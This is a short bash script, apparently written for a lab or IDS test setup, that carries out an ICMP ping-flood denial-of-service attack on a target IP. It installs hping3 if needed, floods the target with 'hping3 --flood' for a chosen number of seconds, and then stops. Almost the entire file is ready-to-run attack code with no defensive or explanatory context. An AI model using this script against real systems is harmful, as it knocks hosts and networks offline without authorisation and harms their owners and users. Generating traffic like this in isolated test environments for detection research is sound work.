#!/bin/bash
# attack_icmp_flood.sh
# ICMP flood attack (ping flood) using hping3 or ping
# Usage: ./attack_icmp_flood.sh <target_ip> [duration_seconds]

TARGET_IP="${1:-192.168.64.2}"
DURATION="${2:-10}"

echo "=========================================="
echo "Starting ICMP Flood Attack (Ping Flood)"
echo "Target: $TARGET_IP"
echo "Duration: ${DURATION} seconds"
echo "=========================================="

if ! command -v hping3 &> /dev/null; then
    echo "hping3 not found. Installing..."
    sudo apt-get update
    sudo apt-get install -y hping3
fi

echo "[*] Flooding $TARGET_IP with ICMP packets for ${DURATION} seconds..."
sudo hping3 -1 --flood $TARGET_IP &
HPING_PID=$!

sleep $DURATION

echo "[*] Stopping ICMP flood..."
sudo kill -9 $HPING_PID 2>/dev/null

echo "[*] ICMP flood completed at $(date)"
